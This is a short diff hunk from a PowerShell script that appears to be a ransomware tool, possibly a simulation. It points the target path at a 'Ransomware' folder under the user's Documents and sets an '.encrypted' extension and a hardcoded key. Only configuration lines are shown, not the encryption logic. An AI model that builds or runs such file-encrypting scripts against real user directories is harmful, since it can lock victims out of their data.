@@ -209,7 +209,7 @@ Param(
 
 # Define parameters and their defaults
 #$Mode = "encrypt"
-$TargetPath = "YOUR_TARGETED_DIRECTORY"
+$TargetPath = "$env:userprofile\Documents\Ransomware" #YOUR TARGETED FOLDER
 $Extension = ".encrypted"
 $Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
 
